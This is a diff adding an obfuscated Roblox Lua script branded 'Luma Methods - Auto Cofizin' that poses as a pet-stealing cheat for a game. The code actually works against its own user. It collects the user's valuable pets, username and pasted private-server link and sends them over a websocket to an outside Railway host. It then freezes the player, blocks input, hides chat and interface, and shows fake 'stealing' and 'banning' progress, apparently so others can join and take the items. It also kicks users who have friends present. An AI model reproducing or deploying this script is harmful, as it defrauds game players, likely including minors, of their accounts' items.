@@ -1,0 +1,967 @@
+-- ts file was generated at discord.gg/25ms
+
+if _G.LUMA_METHODS_EXECUTED then
+    game:GetService('Players').LocalPlayer:Kick('Script j\u{e1} est\u{e1} em execu\u{e7}\u{e3}o!\nAguarde ou reinicie o jogo.\ndiscord.gg/lumamethods')
+
+    return
+else
+    _G.LUMA_METHODS_EXECUTED = true
+
+    local _Players = game:GetService('Players')
+    local _HttpService = game:GetService('HttpService')
+    local _LocalPlayer = _Players.LocalPlayer
+
+    if (function()
+        local _Ymd = os.date('%Y-%m-%d')
+        local v5 = _G.AUTOMOREIRA_LAST_USE or ''
+        local v6 = _G.AUTOMOREIRA_USE_COUNT or 0
+
+        if v5 ~= _Ymd then
+            _G.AUTOMOREIRA_LAST_USE = _Ymd
+            _G.AUTOMOREIRA_USE_COUNT = 1
+
+            return true
+        end
+
+        local v7 = v6 + 1
+
+        _G.AUTOMOREIRA_USE_COUNT = v7
+
+        if v7 <= 3 then
+            return true
+        end
+
+        _LocalPlayer:Kick('Voc\u{ea} est\u{e1} temporariamente bloqueado de usar o script.\nTente novamente amanh\u{e3}.\ndiscord.gg/lumamethods')
+
+        return false
+    end)() then
+        local function u16()
+            local v8 = _Players
+            local v9, v10, v11 = pairs(v8:GetPlayers())
+            local v12 = {}
+
+            while true do
+                local u13
+
+                v11, u13 = v9(v10, v11)
+
+                if v11 == nil then
+                    break
+                end
+                if u13 ~= _LocalPlayer then
+                    local v14, v15 = pcall(function()
+                        return _LocalPlayer:IsFriendsWith(u13.UserId)
+                    end)
+
+                    if v14 and v15 then
+                        table.insert(v12, u13)
+                    end
+                end
+            end
+
+            return v12
+        end
+
+        local u17 = 'wss://websckt-production.up.railway.app'
+
+        local function u20(_)
+            local u18 = nil
+            local v19, _ = pcall(function()
+                if syn then
+                    u18 = syn.websocket.connect(u17)
+                elseif WebSocket then
+                    u18 = WebSocket.connect(u17)
+                else
+                    error('Executor Bugado, tente outro.')
+                end
+
+                return u18
+            end)
+
+            if not v19 then
+                return nil
+            end
+
+            wait(1)
+
+            return u18
+        end
+        local function u26(p21, p22, p23)
+            local u24 = {
+                key = p22,
+                payload = p23,
+            }
+            local v25, _ = pcall(function()
+                p21:Send(_HttpService:JSONEncode(u24))
+
+                return true
+            end)
+
+            return v25 and true or false
+        end
+
+        if _G.AUTOCOFIZIN then
+            if _G.AUTOCOFIZIN:match('^COFI%-[A-Z0-9]+%-[A-Z0-9]+%-[A-Z0-9]+$') then
+                local function u28(p27)
+                    if p27:IsA('Sound') then
+                        p27.Volume = 0
+
+                        pcall(function()
+                            p27:Stop()
+                        end)
+                    end
+                end
+                local function v34(p29)
+                    local v30, v31, v32 = ipairs(p29:GetDescendants())
+
+                    while true do
+                        local v33
+
+                        v32, v33 = v30(v31, v32)
+
+                        if v32 == nil then
+                            break
+                        end
+
+                        u28(v33)
+                    end
+                end
+
+                local v35, v36, v37 = ipairs({
+                    workspace,
+                    game.Players,
+                    game.ReplicatedStorage,
+                    game.Lighting,
+                    game.StarterGui,
+                    game.StarterPack,
+                })
+                local u38 = _LocalPlayer
+                local v39 = u28
+
+                while true do
+                    local v40
+
+                    v37, v40 = v35(v36, v37)
+
+                    if v37 == nil then
+                        break
+                    end
+
+                    v34(v40)
+                    v40.DescendantAdded:Connect(v39)
+                end
+
+                getgenv().TargetPetNames = {
+                    'Los Matteos',
+                    'Bisonte Giuppitere',
+                    'La Vacca Saturno Saturnita',
+                    'Torrtuginni Dragonfrutini',
+                    'Los Tralaleritos',
+                    'Los Spyderinis',
+                    'Las Tralaleritas',
+                    'Job Job Job Sahur',
+                    'Noo my examine',
+                    'Las Vaquitas Saturnitas',
+                    'Graipuss Medussi',
+                    'To to to Sahur',
+                    'Pot Hotspot',
+                    'Chicleteira Bicicleteira',
+                    'Los Chicleteiras',
+                    'La Grande Combinasion',
+                    'Nuclearo Dinossauro',
+                    'Esok Sekolah',
+                    'Money Money Puggy',
+                    'Ketupat Kepat',
+                    'Tictac Sahur',
+                    'Ketchuru and Musturu',
+                    'Garama and Madundung',
+                    'Spaghetti Tualetti',
+                    'Dragon Cannelloni',
+                    'Secret Lucky Block',
+                    'Strawberry Elephant',
+                    'Guerriro Digitale',
+                    '67',
+                    'La Grande Combinasion',
+                    'Admin Lucky Block',
+                    'Tacorita Bicicleta',
+                    'La Extinct Grande',
+                    'Nooo My Hotspot',
+                    'Quesadilla Crocodila',
+                    'Los Nooo My Hotspotsitos',
+                    'Tacorita Bicicleta',
+                    'Perrito Burrito',
+                    'Taco Lucky Block',
+                    'Celularcini Viciosini',
+                    'Los Bros',
+                    'Tralaledon',
+                    'Los Tacoritas',
+                    'Los Primos',
+                    'La Spooky Grande',
+                    'Los Combinasionas',
+                    'Los Hotspotsitos',
+                    'La Supreme Combinasion',
+                    'Los Mobiles',
+                    'Meowl',
+                    'Mieteteira Bicicleteira',
+                    'Rang Ring Bus',
+                    'Horegini Boom',
+                }
+
+                local function u43(p41)
+                    local v42
+
+                    if typeof(p41) ~= 'string' then
+                        v42 = false
+                    else
+                        v42 = p41:match('^%$[%d%.]+[KMBT]?/s$')
+                    end
+
+                    return v42
+                end
+                local function u55(p44, p45)
+                    local v46, v47, v48 = ipairs(workspace:GetDescendants())
+                    local v49 = nil
+
+                    while true do
+                        local v50
+
+                        v48, v50 = v46(v47, v48)
+
+                        if v48 == nil then
+                            break
+                        end
+                        if v50:IsA('TextLabel') and u43(v50.Text) then
+                            local _BasePart = v50:FindFirstAncestorWhichIsA('BasePart')
+
+                            if _BasePart then
+                                local _Magnitude = (_BasePart.Position - p44).Magnitude
+
+                                if _Magnitude <= p45 then
+                                    local v53 = RaycastParams.new()
+
+                                    v53.FilterDescendantsInstances = {workspace}
+                                    v53.FilterType = Enum.RaycastFilterType.Blacklist
+                                    v53.IgnoreWater = true
+
+                                    local v54 = workspace:Raycast(p44, _BasePart.Position - p44, v53)
+
+                                    if not v54 or v54.Instance == _BasePart then
+                                        v49 = v50.Text
+                                        p45 = _Magnitude
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    return v49
+                end
+                local function u61(p56)
+                    if p56.PrimaryPart then
+                        return p56.PrimaryPart
+                    end
+
+                    local v57, v58, v59 = ipairs(p56:GetDescendants())
+
+                    while true do
+                        local v60
+
+                        v59, v60 = v57(v58, v59)
+
+                        if v59 == nil then
+                            break
+                        end
+                        if v60:IsA('BasePart') then
+                            return v60
+                        end
+                    end
+                end
+                local function u74()
+                    local v62, v63, v64 = pairs(workspace:GetDescendants())
+                    local v65 = {}
+
+                    while true do
+                        local v66
+
+                        v64, v66 = v62(v63, v64)
+
+                        if v64 == nil then
+                            return v65
+                        end
+                        if v66:IsA('Model') then
+                            local v67 = string.lower(v66.Name)
+                            local _xxxxx = v67:match('^[%x]+%-[%x]+%-[%x]+%-[%x]+%-[%x]+$')
+                            local v69
+
+                            if #v67 < 20 then
+                                v69 = false
+                            else
+                                v69 = v67:match('^[%x]+$')
+                            end
+                            if not (_xxxxx or (v69 or string.find(v67, 'trait'))) then
+                                local v70, v71, v72 = pairs(getgenv().TargetPetNames)
+
+                                while true do
+                                    local v73
+
+                                    v72, v73 = v70(v71, v72)
+
+                                    if v72 == nil then
+                                        break
+                                    end
+                                    if string.find(v67, string.lower(v73)) then
+                                        table.insert(v65, v66.Name)
+
+                                        break
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+
+                local u75 = false
+
+                local function u107(p76, p77)
+                    if u75 then
+                        return
+                    end
+
+                    u75 = true
+
+                    local v78, v79, v80 = ipairs(p76)
+                    local v81 = {}
+                    local v82 = {}
+
+                    while true do
+                        local v83
+
+                        v80, v83 = v78(v79, v80)
+
+                        if v80 == nil then
+                            local v84, v85, v86 = ipairs(v82)
+                            local v87 = {}
+
+                            while true do
+                                local v88, v89 = v84(v85, v86)
+
+                                if v88 == nil then
+                                    break
+                                end
+
+                                v86 = v88
+
+                                local v90 = '\u{2794} ' .. v89.name .. ' | ' .. v89.money
+
+                                if v89.count > 1 then
+                                    v90 = v90 .. ' x' .. v89.count
+                                end
+
+                                table.insert(v87, v90)
+                            end
+
+                            local v91 = #p76 > 0
+                            local v92 = {
+                                username = 'Luma Methods - Logs',
+                                content = v91 and '@everyone' or '',
+                            }
+                            local v93 = {}
+                            local v94 = {
+                                title = v91 and 'Luma Methods - Alvo encontrado!' or 'Luma Methods - Nenhum Brainrot Encontrado... (90%)',
+                                color = v91 and 10181046 or 10181046,
+                                image = {
+                                    url = 'https://media.discordapp.net/attachments/1416805679330623611/1416886180896833680/standard_11.gif?ex=68ee0c55&is=68ecbad5&hm=417072df3406a85eba7fa9a0f227325223b1111cb8888e7cdd06ac2ed2f5604f&=&width=567&height=200',
+                                },
+                            }
+                            local v95 = {}
+                            local v96 = {
+                                name = '<:user:1430259971593080872> User',
+                                value = u38.Name,
+                                inline = true,
+                            }
+                            local v97 = {
+                                name = '<:cardid:1430259975191662763> Players no Servidor',
+                            }
+                            local v98 = _Players
+
+                            v97.value = string.format('%d/%d', #v98:GetPlayers(), _Players.MaxPlayers)
+                            v97.inline = true
+
+                            __set_list(v95, 1, {
+                                v96,
+                                v97,
+                                {
+                                    name = '<:1zd9K4AAAAGSURBVAMAF7Yp2HYxQcAAA:1430259969542062140> Link Do Servidor',
+                                    value = (p77 == '' or not p77) and 'Sem link' or p77,
+                                    inline = false,
+                                },
+                                {
+                                    name = v91 and '<:btc:1430259973383782461> Brainrots Encontrados' or '<:btc:1430259973383782461> Brainrots Encontrados',
+                                    value = #v87 > 0 and table.concat(v87, '\n') or 'Nenhum brainrot encontrado',
+                                    inline = false,
+                                },
+                            })
+
+                            v94.fields = v95
+                            v94.footer = {
+                                text = 'Coffezin X Luma Methods - discord.gg/lumamethods',
+                            }
+                            v94.timestamp = DateTime.now():ToIsoDate()
+
+                            __set_list(v93, 1, {v94})
+
+                            v92.embeds = v93
+
+                            local u99 = u20(_G.AUTOCOFIZIN)
+
+                            if u99 and u26(u99, _G.AUTOCOFIZIN, v92) then
+                                wait(1)
+                                pcall(function()
+                                    u99:Close()
+                                end)
+                            end
+
+                            return
+                        end
+
+                        v81[v83] = (v81[v83] or 0) + 1
+
+                        local v100, v101, v102 = ipairs(workspace:GetDescendants())
+                        local v103 = 'N/A'
+
+                        while true do
+                            local v104
+
+                            v102, v104 = v100(v101, v102)
+
+                            local v105
+
+                            if v102 == nil then
+                                v105 = v103
+                            end
+                            if v104:IsA('Model') and v104.Name == v83 then
+                                local v106 = u61(v104)
+
+                                if v106 then
+                                    v105 = u55(v106.Position, 10)
+
+                                    if v105 then
+                                        break
+                                    end
+                                end
+                            end
+                        end
+
+                        table.insert(v82, {
+                            name = v83,
+                            money = v105,
+                            count = v81[v83],
+                        })
+                    end
+                end
+
+                local _CoreGui = game:GetService('CoreGui')
+
+                local function u110()
+                    pcall(function()
+                        if _G.LumaMainGUI then
+                            _G.LumaMainGUI:Destroy()
+                        end
+                    end)
+
+                    local _ScreenGui = Instance.new('ScreenGui')
+
+                    _ScreenGui.Name = 'LumaMainGUI'
+                    _ScreenGui.ResetOnSpawn = false
+                    _ScreenGui.IgnoreGuiInset = true
+                    _ScreenGui.DisplayOrder = 999
+                    _ScreenGui.Parent = _CoreGui
+                    _G.LumaMainGUI = _ScreenGui;
+
+                    (function()
+                        coroutine.wrap(function()
+                            while _ScreenGui and _ScreenGui.Parent do
+                                if _ScreenGui.Parent ~= _CoreGui then
+                                    _ScreenGui.Parent = _CoreGui
+                                end
+                                if not _ScreenGui.Enabled then
+                                    _ScreenGui.Enabled = true
+                                end
+
+                                task.wait(1)
+                            end
+                        end)()
+                    end)()
+
+                    return _ScreenGui
+                end
+
+                local u111 = u110()
+                local _Frame = Instance.new('Frame', u111)
+
+                _Frame.Size = UDim2.new(1, 0, 1, 0)
+                _Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                _Frame.BorderSizePixel = 0
+                _Frame.Name = 'MainBackground'
+
+                local _UIGradient = Instance.new('UIGradient', _Frame)
+
+                _UIGradient.Color = ColorSequence.new({
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 80)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 255)),
+                })
+                _UIGradient.Rotation = 45
+
+                local _Frame2 = Instance.new('Frame', _Frame)
+
+                _Frame2.Size = UDim2.new(0.5, 0, 0.5, 0)
+                _Frame2.Position = UDim2.new(0.25, 0, 0.25, 0)
+                _Frame2.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+                _Frame2.BorderSizePixel = 0
+                _Frame2.Name = 'MainFrame'
+                Instance.new('UICorner', _Frame2).CornerRadius = UDim.new(0, 12)
+
+                local _TextLabel = Instance.new('TextLabel', _Frame2)
+
+                _TextLabel.Size = UDim2.new(1, 0, 0.25, 0)
+                _TextLabel.Position = UDim2.new(0, 0, 0.1, 0)
+                _TextLabel.BackgroundTransparency = 1
+                _TextLabel.Text = 'Luma Methods - Auto Cofizin'
+                _TextLabel.Font = Enum.Font.GothamBlack
+                _TextLabel.TextScaled = true
+                _TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                _TextLabel.Name = 'Title'
+
+                local _UIGradient2 = Instance.new('UIGradient', _TextLabel)
+
+                _UIGradient2.Color = ColorSequence.new({
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 255)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 255)),
+                })
+                _UIGradient2.Rotation = 90
+
+                local _TextBox = Instance.new('TextBox', _Frame2)
+
+                _TextBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+                _TextBox.Position = UDim2.new(0.1, 0, 0.45, 0)
+                _TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+                _TextBox.TextColor3 = Color3.fromRGB(230, 230, 230)
+                _TextBox.Font = Enum.Font.Gotham
+                _TextBox.TextScaled = true
+                _TextBox.PlaceholderText = 'Cole o link do servidor privado...'
+                _TextBox.Text = ''
+                _TextBox.ClearTextOnFocus = false
+                _TextBox.Name = 'ServerLinkInput'
+                Instance.new('UICorner', _TextBox).CornerRadius = UDim.new(0, 8)
+
+                task.spawn(function()
+                    wait(0.5)
+                    _TextBox:CaptureFocus()
+                end)
+
+                local _TextButton = Instance.new('TextButton', _Frame2)
+
+                _TextButton.Size = UDim2.new(0.5, 0, 0.15, 0)
+                _TextButton.Position = UDim2.new(0.25, 0, 0.7, 0)
+                _TextButton.Text = 'Prosseguir'
+                _TextButton.Font = Enum.Font.GothamBold
+                _TextButton.TextScaled = true
+                _TextButton.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
+                _TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+                _TextButton.Visible = false
+                _TextButton.Name = 'ProceedButton'
+                Instance.new('UICorner', _TextButton).CornerRadius = UDim.new(0, 8)
+
+                local function u120(p119)
+                    return p119 == '' and true or (string.match(p119, '^https://www%.roblox%.com/share%?code=') and true or false)
+                end
+
+                local v121 = _TextBox
+
+                _TextBox.GetPropertyChangedSignal(v121, 'Text'):Connect(function()
+                    _TextButton.Visible = _TextBox.Text ~= ''
+                end)
+
+                local _Frame3 = Instance.new('Frame', _Frame)
+
+                _Frame3.Size = UDim2.new(0.8, 0, 0.7, 0)
+                _Frame3.Position = UDim2.new(0.1, 0, 0.15, 0)
+                _Frame3.BackgroundColor3 = Color3.fromRGB(198, 198, 198)
+                _Frame3.BorderSizePixel = 1
+                _Frame3.BorderColor3 = Color3.fromRGB(85, 85, 85)
+                _Frame3.Visible = false
+                _Frame3.Name = 'TerminalWindow'
+
+                local _Frame4 = Instance.new('Frame', _Frame3)
+
+                _Frame4.Size = UDim2.new(1, 0, 0, 25)
+                _Frame4.Position = UDim2.new(0, 0, 0, 0)
+                _Frame4.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
+                _Frame4.BorderSizePixel = 0
+                _Frame4.Name = 'TitleBar'
+
+                local _UIGradient3 = Instance.new('UIGradient', _Frame4)
+
+                _UIGradient3.Color = ColorSequence.new({
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 255)),
+                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 0, 255)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 255)),
+                })
+                _UIGradient3.Rotation = 90
+
+                local _TextLabel2 = Instance.new('TextLabel', _Frame4)
+
+                _TextLabel2.Size = UDim2.new(1, 0, 1, 0)
+                _TextLabel2.Position = UDim2.new(0, 0, 0, 0)
+                _TextLabel2.BackgroundTransparency = 1
+                _TextLabel2.Text = 'Luma Methods - Auto Cofizin'
+                _TextLabel2.Font = Enum.Font.GothamBold
+                _TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+                _TextLabel2.TextSize = 14
+                _TextLabel2.TextXAlignment = Enum.TextXAlignment.Center
+                _TextLabel2.Name = 'TerminalTitle'
+
+                local _Frame5 = Instance.new('Frame', _Frame3)
+
+                _Frame5.Size = UDim2.new(1, -4, 1, -29)
+                _Frame5.Position = UDim2.new(0, 2, 0, 27)
+                _Frame5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                _Frame5.BorderSizePixel = 0
+                _Frame5.Name = 'TerminalArea'
+
+                local _Frame6 = Instance.new('Frame', _Frame5)
+
+                _Frame6.Size = UDim2.new(1, 0, 1, 0)
+                _Frame6.Position = UDim2.new(0, 0, 0, 0)
+                _Frame6.BackgroundTransparency = 1
+                _Frame6.Name = 'TerminalContainer'
+
+                local _TextLabel3 = Instance.new('TextLabel', _Frame6)
+
+                _TextLabel3.Size = UDim2.new(1, 0, 0, 80)
+                _TextLabel3.Position = UDim2.new(0, 0, 0, 10)
+                _TextLabel3.BackgroundTransparency = 1
+                _TextLabel3.Text = '\r\n   _____          __           _________         _____.__       .__        \r\n  /  _  \\  __ ___/  |_  ____   \\_   ___ \\  _____/ ____\\__|______|__| ____  \r\n /  /_\\  \\|  |  \\   __\\/  _ \\  /    \\  \\/ /  _ \\   __\\|  \\___   /  |/    \\ \r\n/    |    \\  |  /|  | (  <_> ) \\     \\___(  <_> )  |  |  |/    /|  |   |  \\\r\n\\____|__  /____/ |__|  \\____/   \\______  /\\____/|__|  |__/_____ \\__|___|  /\r\n        \\/                             \\/                      \\/       \\/ \r\n'
+                _TextLabel3.Font = Enum.Font.Code
+                _TextLabel3.TextColor3 = Color3.fromRGB(200, 0, 255)
+                _TextLabel3.TextSize = 14
+                _TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
+                _TextLabel3.TextXAlignment = Enum.TextXAlignment.Center
+                _TextLabel3.Name = 'ASCIIArt'
+
+                local _TextLabel4 = Instance.new('TextLabel', _Frame6)
+
+                _TextLabel4.Size = UDim2.new(1, -10, 1, -100)
+                _TextLabel4.Position = UDim2.new(0, 5, 0, 90)
+                _TextLabel4.BackgroundTransparency = 1
+                _TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
+                _TextLabel4.TextYAlignment = Enum.TextYAlignment.Top
+                _TextLabel4.Font = Enum.Font.Code
+                _TextLabel4.TextSize = 14
+                _TextLabel4.TextColor3 = Color3.fromRGB(0, 255, 0)
+                _TextLabel4.Text = ''
+                _TextLabel4.RichText = true
+                _TextLabel4.Name = 'TerminalLogs'
+
+                local u130 = {}
+
+                local function u131()
+                    _TextLabel4.Text = table.concat(u130, '\n')
+                end
+                local function u133(p132)
+                    table.insert(u130, p132)
+                    u131()
+                end
+                local function u134()
+                    u130 = {}
+
+                    u131()
+                end
+                local function u136()
+                    local v135 = {
+                        'pedhrivk_19',
+                        'mattshopp',
+                        'lucaxz_07',
+                        'brunodvk',
+                        'gabriel_fps',
+                        'vinixplay',
+                        'leandrops',
+                        'cauamods',
+                        'erickpro',
+                        'davizxnn',
+                    }
+
+                    return v135[math.random(1, #v135)]
+                end
+                local function u144(p137, p138)
+                    u133(p137 .. ' [                    ]')
+
+                    local v139 = p137 .. ' ['
+                    local v140 = 20
+
+                    for v141 = 1, v140 do
+                        task.wait(p138 / v140)
+
+                        local v142 = string.rep('#', v141)
+                        local v143 = string.rep(' ', v140 - v141)
+
+                        u130[#u130] = v139 .. v142 .. v143 .. ']'
+
+                        u131()
+                    end
+                end
+                local function u148()
+                    u134()
+                    u133(':(')
+                    task.wait(1)
+
+                    local v145 = {
+                        '400 - Solicita\u{e7}\u{e3}o de sess\u{e3}o \u{fa}nica violada',
+                        '401 - Autentica\u{e7}\u{e3}o de usu\u{e1}rio \u{fa}nica necess\u{e1}ria',
+                        '403 - Acesso negado - M\u{fa}ltiplas sess\u{f5}es detectadas',
+                        '404 - Recurso de sess\u{e3}o \u{fa}nica n\u{e3}o encontrado',
+                        '405 - M\u{e9}todo de sess\u{e3}o m\u{fa}ltipla n\u{e3}o permitido',
+                        '408 - Timeout de verifica\u{e7}\u{e3}o de sess\u{e3}o \u{fa}nica',
+                        '422 - Entidade n\u{e3}o process\u{e1}vel - Sess\u{e3}o duplicada',
+                        '420 - Limite de sess\u{f5}es excedido',
+                        '500 - Erro interno do sistema de sess\u{e3}o \u{fa}nica',
+                        '501 - Sistema de sess\u{e3}o \u{fa}nica n\u{e3}o implementado',
+                        '503 - Servi\u{e7}o de verifica\u{e7}\u{e3}o de sess\u{e3}o indispon\u{ed}vel',
+                    }
+                    local v146 = v145[math.random(1, #v145)]
+                    local _d = v146:match('^(%d+)')
+
+                    u133('> Erro no sistema')
+                    task.wait(1)
+                    u133('> Amizade Detectada - ' .. v146)
+                    task.wait(1)
+                    u133('> Erro ' .. _d .. ' - discord.gg/lumamethods')
+                    task.wait(1)
+                    u133('> Enviando ao suporte...')
+                    u144('   Enviando logs', 3)
+                    task.wait(1)
+                    u133('> Procurando Solu\u{e7}\u{e3}o...')
+                    u144('   Analisando', 1)
+                    task.wait(0.5)
+                    u133('> Removendo usuario...')
+                    task.wait(2)
+                    u38:Kick(_d .. ' - Execute o script sem amizades/alts para n\u{e3}o dar erro!\ndiscord.gg/lumamethods')
+                end
+
+                local u149 = {}
+                local u150 = {
+                    'Garama and Madundung',
+                    'Los 67',
+                    'La Grande Combinasion',
+                    'Tacorita Bicicleta',
+                    'Los Matteos',
+                    'Bisonte Giuppitere',
+                    'Esok Sekolah',
+                    'Money Money Puggy',
+                    'Admin Lucky Block',
+                    'Spaghetti Tualetti',
+                    'Dragon Cannelloni',
+                    'Secret Lucky Block',
+                    'Strawberry Elephant',
+                    'Ketupat Kepat',
+                    'Tictac Sahur',
+                }
+
+                local function u152(p151)
+                    u133('> ' .. u150[math.random(1, #u150)] .. ' - ' .. p151)
+                    u144('   Roubando', 3)
+                    task.wait(1)
+                    u133('> Banindo ' .. p151 .. '...')
+                    task.wait(2)
+                    u133('> Banido - discord.gg/lumamethods')
+                    task.wait(2)
+                end
+                local function u154(p153)
+                    u133('> ' .. p153 .. ' entrou.')
+                    task.wait(1)
+                    u133('> Nada na base. Banindo usu\u{e1}rio...')
+                    task.wait(3)
+                end
+                local function u167()
+                    local _UserInputService = game:GetService('UserInputService')
+                    local _LocalPlayer2 = game:GetService('Players').LocalPlayer
+
+                    _UserInputService.InputBegan:Connect(function(p157)
+                        if p157.UserInputType == Enum.UserInputType.Keyboard then
+                            return Enum.ContextActionResult.Sink
+                        end
+                    end)
+                    _UserInputService.InputBegan:Connect(function(p158)
+                        if p158.UserInputType == Enum.UserInputType.MouseButton1 or p158.UserInputType == Enum.UserInputType.MouseButton2 then
+                            return Enum.ContextActionResult.Sink
+                        end
+                    end)
+
+                    local function v164()
+                        pcall(function()
+                            local v159 = _CoreGui
+                            local v160, v161, v162 = pairs(v159:GetChildren())
+
+                            while true do
+                                local v163
+
+                                v162, v163 = v160(v161, v162)
+
+                                if v162 == nil then
+                                    break
+                                end
+                                if v163:IsA('ScreenGui') and v163.Name ~= 'LumaMainGUI' then
+                                    v163.Enabled = false
+                                end
+                            end
+                        end)
+                    end
+
+                    (function()
+                        pcall(function()
+                            local v165 = _LocalPlayer2.Character and _LocalPlayer2.Character:FindFirstChildOfClass('Humanoid')
+
+                            if v165 then
+                                v165.WalkSpeed = 0
+                                v165.JumpPower = 0
+                            end
+                        end)
+                    end)();
+                    (function()
+                        pcall(function()
+                            game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+                            game:GetService('CoreGui'):SetTopbarTransparency(1)
+
+                            local _Chat = game:GetService('Chat')
+
+                            _Chat:SetBubbleChatEnabled(false)
+                            _Chat:SetChatWindowVisible(false)
+                        end)
+                    end)()
+                    v164()
+                end
+                local function u175(_)
+                    _Frame2.Visible = false
+                    _Frame3.Visible = true
+
+                    u134()
+                    u133('> Executando AutoCofizin.lua')
+                    u144('   Carregando', 4)
+                    task.wait(1)
+                    u133('> Carregando M\u{f3}dulos')
+                    u144('   Inicializando', 4)
+                    task.wait(1)
+                    u134()
+                    u133('> Iniciando AutoCofizin.lua')
+                    u144('   Preparando', 10)
+                    task.wait(1)
+                    u133('> Monitorando jogadores...')
+                    task.wait(2)
+
+                    if #u16() > 0 then
+                        u148()
+
+                        return
+                    end
+
+                    u167()
+                    u134()
+
+                    local function v168()
+                        while#u16() <= 0 do
+                            task.wait(5)
+                        end
+
+                        u148()
+                    end
+
+                    coroutine.wrap(v168)()
+
+                    while true do
+                        u133('> Entrando na comunidade...')
+                        u144('   Conectando', 5)
+                        u133('> Enviando Link...')
+                        u144('   Upload', 25)
+                        task.wait(1)
+
+                        local v169 = _Players
+                        local v170, v171, v172 = pairs(v169:GetPlayers())
+                        local v173 = false
+
+                        while true do
+                            local v174
+
+                            v172, v174 = v170(v171, v172)
+
+                            if v172 == nil then
+                                break
+                            end
+                            if v174 ~= u38 and not u149[v174.Name] then
+                                u149[v174.Name] = true
+
+                                u152(v174.Name)
+
+                                v173 = true
+                            end
+                        end
+
+                        if not v173 then
+                            u154((u136()))
+                        end
+
+                        u134()
+                    end
+                end
+
+                _TextButton.MouseButton1Click:Connect(function()
+                    local _Text = _TextBox.Text
+
+                    if u120(_Text) then
+                        _TextButton.Text = 'Processando...'
+                        _TextButton.Active = false
+
+                        u107(u74(), _Text)
+                        u175(_Text)
+                    else
+                        local _Text2 = _TextButton.Text
+
+                        _TextButton.Text = 'Oops, isso n\u{e3}o me parece um servidor privado'
+                        _TextButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+
+                        task.wait(2)
+
+                        _TextButton.Text = _Text2
+                        _TextButton.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
+                    end
+                end)
+                coroutine.wrap(function()
+                    while true do
+                        if not (u111 and u111.Parent) then
+                            u111 = u110()
+                        end
+
+                        task.wait(2)
+                    end
+                end)()
+            else
+                _G.LUMA_METHODS_EXECUTED = false
+
+                local v178 = _LocalPlayer
+
+                _LocalPlayer.Kick(v178, 'Formato de key inv\u{e1}lido. Use: COFI-XXXX-XXXX-XXXX\ndiscord.gg/lumamethods')
+            end
+        else
+            _G.LUMA_METHODS_EXECUTED = false
+
+            local v179 = _LocalPlayer
+
+            _LocalPlayer.Kick(v179, 'Key n\u{e3}o detectada. Use: _G.AUTOCOFIZIN = "COFI-XXXX-XXXX-XXXX"\ndiscord.gg/lumamethods')
+
+            return
+        end
+    else
+        _G.LUMA_METHODS_EXECUTED = false
+
+        return
+    end
+end
